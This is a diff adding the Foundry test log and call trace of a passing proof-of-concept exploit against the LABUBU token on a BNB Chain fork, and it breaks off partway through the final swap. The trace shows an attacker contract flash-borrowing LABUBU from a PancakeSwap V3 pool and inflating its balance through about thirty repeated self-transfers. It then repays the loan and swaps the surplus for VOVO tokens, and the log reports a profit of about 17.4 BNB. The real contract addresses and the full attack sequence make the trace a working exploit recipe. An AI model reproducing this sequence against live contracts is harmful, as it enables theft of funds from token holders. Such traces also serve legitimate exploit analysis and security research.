@@ -1,0 +1,317 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/LABUBU_exp.sol:LABUBU_exp
+[PASS] testPoC() (gas: 2018771)
+Logs:
+  Profit in BNB: 17.403082890323102166
+
+Traces:
+  [7955] LABUBU_exp::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 44751944 [4.475e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C], "PancakeV3Pool")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(PancakeSwap: Smart Router V3: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], "PancakeSwap: Smart Router V3")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "PancakeSwap: Router v2")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(LABUBU: [0x2fF960F1D9AF1A6368c2866f79080C1E0B253997], "LABUBU")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(VOVO Token: [0x58B26C9b2d32dF1D0E505BCCa2D776698c9bE6B6], "VOVO Token")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(wBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "wBNB")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [2114371] LABUBU_exp::testPoC()
+    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [824517] → new AttackerC@0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
+    │   └─ ← [Return] 4118 bytes of code
+    ├─ [1247671] AttackerC::attack()
+    │   ├─ [2829] LABUBU::balanceOf(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C]) [staticcall]
+    │   │   └─ ← [Return] 415636276381601458 [4.156e17]
+    │   ├─ [255033] PancakeV3Pool::flash(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17], 0, 0x000000000000000000000000e70294c3d81ea914a883ad84fd80473c048c028c00000000000000000000000000000000000000000000000005c4a2fdc17dceb2)
+    │   │   ├─ [829] LABUBU::balanceOf(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C]) [staticcall]
+    │   │   │   └─ ← [Return] 415636276381601458 [4.156e17]
+    │   │   ├─ [2886] VOVO Token::balanceOf(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C]) [staticcall]
+    │   │   │   └─ ← [Return] 12608288158248437362131369009 [1.26e28]
+    │   │   ├─ [29507] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   ├─ emit Transfer(from: PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0 → 0x00000000000000000000000000000000000000000000000005c4a2fdc17dceb2
+    │   │   │   │   @ 0x66554859ed55d6eff316e5207ad2fe91421c9cdf5a7ba04fadeb6a64e7a4cd8d: 0x00000000000000000000000000000000000000000000000005c4a2fdc17dceb2 → 16
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [190293] AttackerC::pancakeV3FlashCallback(1039090690954004 [1.039e15], 0, 0x000000000000000000000000e70294c3d81ea914a883ad84fd80473c048c028c00000000000000000000000000000000000000000000000005c4a2fdc17dceb2)
+    │   │   │   ├─ [24505] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000005c4a2fdc17dceb2 → 0x0000000000000000000000000000000000000000000000000b8945fb82fb9d64
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000000b8945fb82fb9d64 → 0x000000000000000000000000000000000000000000000000114de8f944796c16
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000114de8f944796c16 → 0x00000000000000000000000000000000000000000000000017128bf705f73ac8
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000017128bf705f73ac8 → 0x0000000000000000000000000000000000000000000000001cd72ef4c775097a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000001cd72ef4c775097a → 0x000000000000000000000000000000000000000000000000229bd1f288f2d82c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000229bd1f288f2d82c → 0x000000000000000000000000000000000000000000000000286074f04a70a6de
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000286074f04a70a6de → 0x0000000000000000000000000000000000000000000000002e2517ee0bee7590
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000002e2517ee0bee7590 → 0x00000000000000000000000000000000000000000000000033e9baebcd6c4442
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000033e9baebcd6c4442 → 0x00000000000000000000000000000000000000000000000039ae5de98eea12f4
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000039ae5de98eea12f4 → 0x0000000000000000000000000000000000000000000000003f7300e75067e1a6
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000003f7300e75067e1a6 → 0x0000000000000000000000000000000000000000000000004537a3e511e5b058
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000004537a3e511e5b058 → 0x0000000000000000000000000000000000000000000000004afc46e2d3637f0a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000004afc46e2d3637f0a → 0x00000000000000000000000000000000000000000000000050c0e9e094e14dbc
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000050c0e9e094e14dbc → 0x00000000000000000000000000000000000000000000000056858cde565f1c6e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000056858cde565f1c6e → 0x0000000000000000000000000000000000000000000000005c4a2fdc17dceb20
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000005c4a2fdc17dceb20 → 0x000000000000000000000000000000000000000000000000620ed2d9d95ab9d2
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000620ed2d9d95ab9d2 → 0x00000000000000000000000000000000000000000000000067d375d79ad88884
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000067d375d79ad88884 → 0x0000000000000000000000000000000000000000000000006d9818d55c565736
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000006d9818d55c565736 → 0x000000000000000000000000000000000000000000000000735cbbd31dd425e8
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000735cbbd31dd425e8 → 0x00000000000000000000000000000000000000000000000079215ed0df51f49a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000079215ed0df51f49a → 0x0000000000000000000000000000000000000000000000007ee601cea0cfc34c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000007ee601cea0cfc34c → 0x00000000000000000000000000000000000000000000000084aaa4cc624d91fe
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000084aaa4cc624d91fe → 0x0000000000000000000000000000000000000000000000008a6f47ca23cb60b0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000008a6f47ca23cb60b0 → 0x0000000000000000000000000000000000000000000000009033eac7e5492f62
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000009033eac7e5492f62 → 0x00000000000000000000000000000000000000000000000095f88dc5a6c6fe14
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x00000000000000000000000000000000000000000000000095f88dc5a6c6fe14 → 0x0000000000000000000000000000000000000000000000009bbd30c36844ccc6
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x0000000000000000000000000000000000000000000000009bbd30c36844ccc6 → 0x000000000000000000000000000000000000000000000000a181d3c129c29b78
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000a181d3c129c29b78 → 0x000000000000000000000000000000000000000000000000a74676beeb406a2a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000a74676beeb406a2a → 0x000000000000000000000000000000000000000000000000ad0b19bcacbe38dc
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 415636276381601458 [4.156e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 415636276381601458 [4.156e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000ad0b19bcacbe38dc → 0x000000000000000000000000000000000000000000000000b2cfbcba6e3c078e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4594] LABUBU::transfer(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C], 416675367072555462 [4.166e17])
+    │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C], value: 416675367072555462 [4.166e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000b2cfbcba6e3c078e → 0x000000000000000000000000000000000000000000000000ad0768b0853825c8
+    │   │   │   │   │   @ 0x66554859ed55d6eff316e5207ad2fe91421c9cdf5a7ba04fadeb6a64e7a4cd8d: 16 → 0x00000000000000000000000000000000000000000000000005c85409e903e1d6
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [829] LABUBU::balanceOf(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C]) [staticcall]
+    │   │   │   └─ ← [Return] 416675367072555478 [4.166e17]
+    │   │   ├─ [886] VOVO Token::balanceOf(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C]) [staticcall]
+    │   │   │   └─ ← [Return] 12608288158248437362131369009 [1.26e28]
+    │   │   ├─ emit Flash(sender: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], recipient: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], amount0: 415636276381601458 [4.156e17], amount1: 0, paid0: 1039090690954020 [1.039e15], paid1: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x0000000000000000000000000000000000000000000016849b1c1fdcda2f67a1 → 0x000000000000000000000000000000000000000224db1d8e7fed45b40ffa0e14
+    │   │   │   @ 4: 0x000000000000000af8c75775dcadd2e600000000000000000000000004c4b400 → 0x000000000000000af8c75775dcadd2e6000000000000000000012e6a4edb2086
+    │   │   └─ ← [Stop]
+    │   ├─ [829] LABUBU::balanceOf(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a]) [staticcall]
+    │   │   └─ ← [Return] 12468049200757089736 [1.246e19]
+    │   ├─ [251] PancakeV3Pool::fee() [staticcall]
+    │   │   └─ ← [Return] 2500
+    │   ├─ [25186] LABUBU::approve(PancakeSwap: Smart Router V3: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], 12468049200757089736 [1.246e19])
+    │   │   ├─ emit Approval(owner: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], spender: PancakeSwap: Smart Router V3: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], value: 12468049200757089736 [1.246e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x55cb45f773ce66ae81a414ba2ddeaf419ca7320371825a945ff293cc921a9257: 0 → 0x000000000000000000000000000000000000000000000000ad0768b0853825c8
+    │   │   └─ ← [Return] true
+    │   ├─ [800092] PancakeSwap: Smart Router V3::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x2fF960F1D9AF1A6368c2866f79080C1E0B253997, tokenOut: 0x58B26C9b2d32dF1D0E505BCCa2D776698c9bE6B6, fee: 2500, recipient: 0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a, amountIn: 12468049200757089736 [1.246e19], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   ├─ [1763] SmartRouterHelper::getPool(0x41ff9AA7e16B8B1a8a8dc4f0eFacd93D02d071c9, LABUBU: [0x2fF960F1D9AF1A6368c2866f79080C1E0B253997], VOVO Token: [0x58B26C9b2d32dF1D0E505BCCa2D776698c9bE6B6], 2500) [delegatecall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000e70294c3d81ea914a883ad84fd80473c048c028c
